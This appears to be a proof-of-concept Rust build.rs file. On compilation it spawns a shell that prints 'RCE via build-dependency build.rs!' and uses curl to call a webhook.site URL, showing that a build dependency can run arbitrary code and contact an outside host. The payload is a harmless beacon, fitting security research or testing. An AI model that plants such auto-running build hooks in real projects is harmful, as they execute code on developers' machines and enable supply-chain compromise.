fn main() {
    use std::process::Command;
    Command::new("sh")
        .arg("-c")
        .arg("echo 'RCE via build-dependency build.rs!' && curl -s 'https://webhook.site/test?msg=build-dep+executed'")
        .output()
        .expect("failed to execute process");
    println!("cargo:rerun-if-changed=build.rs");
}
